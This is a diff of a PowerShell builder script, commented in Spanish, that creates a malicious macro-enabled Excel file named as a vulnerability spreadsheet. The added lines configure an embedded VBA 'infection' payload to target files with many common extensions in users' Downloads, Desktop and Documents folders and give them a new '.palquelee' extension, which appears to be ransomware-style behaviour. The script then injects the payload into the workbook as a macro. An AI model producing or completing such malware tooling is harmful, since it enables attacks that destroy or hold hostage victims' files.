@@ -1,15 +1,40 @@
-﻿$base = $PSScriptRoot+"\";
+﻿# Este codigo permite generar el LNK de infección
+# Los parámetros de configuracion están en el archivo VBA asociado
+
+#####
+# VARIABLES PARA CONFIGURAR
+$dirs = "(Downloads|Desktop|Documents)"
+$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
+$final_ext = ".palquelee"
+$file_output = "Planilla de vulnerabilidades.xlsm" # Nombre del archivo final
+$file_image = "bg.jpg" # Nombre de la imagen a embeber
+#####
+#####
+
+
+#####
+# Entorno
+$base = $PSScriptRoot+"\";
 if($base -eq "\"){$base = ".\"}
-
-$output = ($base + "output\" | Resolve-Path).Path;
-$payloads = ($base + "payloads\" | Resolve-Path).Path;
-
+$output = $base + "output\";
+$payloads = $base + "payloads\";
 if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
 if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}
+#####
+#####
+# Archivos con el payload y el output
+$archivo = "MiInfeccion.vba" # Nombre del archivo con código VBA para el Excel
+#####
 
-$file_output = "Planilla de vulnerabilidades.xlsm" # Nombre del archivo final
-$file_code = "MiInfeccion.vba" # Nombre del archivo con código VBA para el Excel
-$file_image = "bg.jpg" # Nombre de la imagen a embeber
+#####
+# Inicio de código
+$cont = Get-Content $payloads$archivo;
+# Reemplazo de Variables
+$ext = "\.(" + ($ext -join "|" -replace "\.","") + ")$"
+$cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
+$cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
+$cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
+$cont
 
 # Abrimos una instancia de la aplicación Excel.
 $excel = New-Object -ComObject Excel.Application;
@@ -67,7 +92,7 @@ $sheet.Cells.Item(14,1).Font.Bold = $true;
 $sheet.Shapes.AddPicture($payloads + $file_image, 0, -1,30000,30000,-1,-1) | Out-Null
 
 # Agregando el código VBA que tengo en un archivo aparte.
-$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $file_code);
+$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $archivo);
 
 # Guardando el archivo como .xlsm
 $workbook.SaveAs($output + $file_output, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled );
